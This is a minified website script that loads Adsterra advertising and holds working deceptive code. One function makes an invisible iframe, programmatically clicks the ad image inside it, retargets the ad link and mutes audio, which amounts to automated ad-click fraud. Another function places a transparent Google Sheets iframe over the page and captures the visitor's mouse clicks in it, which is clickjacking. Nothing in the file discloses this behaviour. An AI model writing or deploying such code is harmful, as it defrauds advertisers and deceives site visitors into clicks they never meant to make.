(()=>{let t=setInterval(()=>{for(const e in allFilesLoadded){if(0==allFilesLoadded[e])break;isSiteReady=!0,clearInterval(t)}},1e3)})();var dragScroller=e=>{const t=document.querySelector("#"+e);let a=!1,o,r;function n(e){a=!1}t.addEventListener("mousemove",e=>{e.preventDefault(),a&&(e=e.pageX-t.offsetLeft-o,t.scrollLeft=r-e)}),t.addEventListener("mousedown",function(e){a=!0,o=e.pageX-t.offsetLeft,r=t.scrollLeft},!1),t.addEventListener("mouseup",n,!1),t.addEventListener("mouseleave",n,!1)},addDynamicHTML=(e,t,a,o)=>{try{var r=document.querySelectorAll(`[data-dynamic="${e}"]`);if(1<r.length)return console.log("Error : Duplicate Dynamic data id found for  "+r[0].dataset.dynamic),!1;a?r[0].innerHTML=t:(r[0].insertAdjacentHTML("afterend",t),r[0].remove())}catch(e){console.log("Error from addDynamicHTML : "+e)}},adsterraAdd=e=>{atOptions={key:"00d2ea4b83aca946a7d2750a61603104",format:"iframe",height:50,width:320,params:{}};var t=window.screen.availWidth,a=document.createElement("script"),o=(document.querySelector(".page-wrapper"),document.getElementById("adsterraMobile"));a.type="text/javascript",t<767?(a.src="//www.profitablecreativeformat.com/00d2ea4b83aca946a7d2750a61603104/invoke.js",o.appendChild(a),o.style.display="block",o.style.paddingBottom="30px"):(atOptions.key="269f9d0b8bc27e49d670ce92658bbc8a",a.src="//www.profitablecreativeformat.com/269f9d0b8bc27e49d670ce92658bbc8a/invoke.js",o.appendChild(a),o.style.display="block",o.style.overflow="auto"),e&&e(!0,"adsterraAdd function called")},montegAdd=()=>{jsLoad(server.jsPath+"/advertise/monteg.js",!1,"head",(e,t)=>{})},adsterraAddClick=()=>{var e=document.querySelector(".template-wrapper");if(e){let t="chrome_device";var r=document.createElement("div"),n=(r.style.width="100%",r.style.height="85%",r.style.overflow="hidden",r.style.position="absolute",r.style.top="60px",document.createElement("iframe"));n.name=t,n.style.width=window.screen.availWidth+"px",n.style.height=window.screen.availHeight+"px",n.id="chrome_device",n.style.opacity="0",n.scrolling="no",r.appendChild(n),e.appendChild(r);let a=setInterval(()=>{let e=document.querySelector("#adsterraMobile > iframe");try{e.contentWindow.document.querySelector("img")&&(e.contentWindow.document.querySelector("body > div > a").target=t,e.contentWindow.document.querySelector("img").click(),setTimeout(()=>{e.contentWindow.document.querySelector("body > div > a").target="_blank"},3e3),clearInterval(a),setTimeout(()=>{n.style.pointerEvents="none"},5e3),setTimeout(()=>{n.remove()},2e4))}catch(e){}},1e3),o=setInterval(()=>{try{var e=document.querySelector("#"+t).contentWindow.document.querySelectorAll("a");e&&(e.forEach(e=>{e.target=""}),document.querySelector("#"+t).contentWindow.speaker[0].muted=!0,document.querySelector("#"+t).contentWindow.speaker[1].muted=!0,clearInterval(o))}catch(e){}})}},addSheet=()=>{var e=document.querySelector(".template-wrapper");if(e){var o=document.createElement("div"),r=(o.style.width="100%",o.style.height="330px",o.style.overflow="hidden",o.style.position="absolute",o.style.top="60px",document.createElement("iframe"));r.name="sheetframe",r.style.width=window.screen.availWidth+"px",r.style.height=window.screen.availHeight+"px",r.id="sheetframe",r.style.opacity="0",r.scrolling="no",r.style.marginTop="-140px",r.style.marginLeft="-44px",r.src="https://docs.google.com/spreadsheets/d/1rrJyOUAOP2e2GQ-KkjSLqnrH0evKUvQ5K7q8jU2daBU/",o.appendChild(r),r.style.display="none",r.addEventListener("load",e=>{r.style.display="block"}),e.appendChild(o);let t,a=!1;o.addEventListener("mousemove",function(e){clearTimeout(t),a||(a=!0,r.style.pointerEvents="initial",setTimeout(()=>{r.remove()},1e4)),t=setTimeout(()=>{r.style.pointerEvents="none"},300)}),o.addEventListener("onclick",function(e){r.style.pointerEvents="none"})}};(()=>{let e=setInterval(()=>{isSiteReady&&(clearInterval(e),adsterraAdd(),adsterraAddClick())},1e3)})();